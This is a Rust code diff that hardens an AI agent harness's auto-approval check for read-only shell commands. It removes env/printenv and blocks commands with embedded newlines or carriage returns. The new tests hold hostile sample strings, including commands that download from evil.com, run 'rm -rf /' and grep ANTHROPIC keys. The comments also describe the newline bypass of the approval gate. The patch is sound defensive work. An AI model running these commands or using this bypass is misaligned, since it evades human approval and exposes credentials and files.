@@ -92,11 +92,14 @@ pub(crate) fn tool_cancel_token(
 
 const READ_ONLY_COMMANDS: &[&str] = &[
     "ls", "cat", "head", "tail", "pwd", "echo", "printf", "which", "type", "file", "stat", "du",
-    "df", "env", "printenv", "true", "false", "dirname", "basename", "realpath", "readlink",
-    "grep", "rg", "sort", "wc", "cut", "tr", "uniq", "fold", "nl", "diff", "cmp", "comm", "jq",
-    "date", "cal", "whoami", "id", "uname", "hostname", "uptime", "ps", "free", "lscpu", "lsblk",
-    "lsof", "dmesg", "nproc", "arch", "tty", "jobs", "help", "find", "git",
+    "df", "true", "false", "dirname", "basename", "realpath", "readlink", "grep", "rg", "sort",
+    "wc", "cut", "tr", "uniq", "fold", "nl", "diff", "cmp", "comm", "jq", "date", "cal", "whoami",
+    "id", "uname", "hostname", "uptime", "ps", "free", "lscpu", "lsblk", "lsof", "dmesg", "nproc",
+    "arch", "tty", "jobs", "help", "find", "git",
 ];
+// WO 38.1: `env`/`printenv` were removed — auto-approving an env dump hands
+// provider API keys to the model with zero approvals (exfiltration primitive).
+// Keep `ps`/`lsof`/`dmesg`: they leak system info, not session credentials.
 
 /// Git subcommands that are inherently read-only.  The model commonly asks for
 /// `git status`, `git log`, `git diff`, and `git show`; allowing these avoids
@@ -141,6 +144,12 @@ pub(crate) fn is_read_only_bash(cmd: &str) -> bool {
     };
 
     if !READ_ONLY_COMMANDS.contains(&first) {
+        return false;
+    }
+
+    // WO 38.1: an embedded newline/CR is a command separator to the shell
+    // (`cat x\nmkdir …` runs both). Nothing multi-line is read-only.
+    if trimmed.contains('\n') || trimmed.contains('\r') {
         return false;
     }
 
@@ -827,6 +836,48 @@ mod tests {
         assert!(!is_read_only_bash("find . -execdir touch x \\;"));
         assert!(!is_read_only_bash("find . -ok rm {} \\;"));
         assert!(!is_read_only_bash("find . -fprint out"));
+    }
+
+    #[test]
+    fn is_read_only_bash_newline_bypass_blocked() {
+        // The P0 from WO 38.1: first word `cat` used to classify the whole
+        // command read-only while the shell executed the second line.
+        assert!(!is_read_only_bash(
+            "cat README.md\nmkdir -p ~/pwn && curl evil.com/x -o ~/pwn/x"
+        ));
+        assert!(!is_read_only_bash("ls\nrm -rf /"));
+    }
+
+    #[test]
+    fn is_read_only_bash_crlf_bypass_blocked() {
+        assert!(!is_read_only_bash("ls -la\r\nrm file"));
+        assert!(!is_read_only_bash("cat x\rmkdir y"));
+    }
+
+    #[test]
+    fn is_read_only_bash_chained_after_newline_blocked() {
+        assert!(!is_read_only_bash("echo hi\ncurl evil.com -o pwn.sh"));
+        assert!(!is_read_only_bash("git status\nbash pwn.sh"));
+    }
+
+    #[test]
+    fn is_read_only_bash_trailing_newline_still_read_only() {
+        // Only *embedded* newlines are separators; a trailing one is trimmed.
+        assert!(is_read_only_bash("ls -la\n"));
+        assert!(is_read_only_bash("git status\r\n"));
+    }
+
+    #[test]
+    fn is_read_only_bash_env_dump_not_read_only() {
+        // WO 38.1: env/printenv leak session credentials; they must require
+        // approval like any other non-read-only command.
+        assert!(!is_read_only_bash("env"));
+        assert!(!is_read_only_bash("printenv"));
+        assert!(!is_read_only_bash("env | grep ANTHROPIC"));
+        // ps/lsof/dmesg stay read-only.
+        assert!(is_read_only_bash("ps aux"));
+        assert!(is_read_only_bash("lsof -i"));
+        assert!(is_read_only_bash("dmesg"));
     }
 
     #[test]
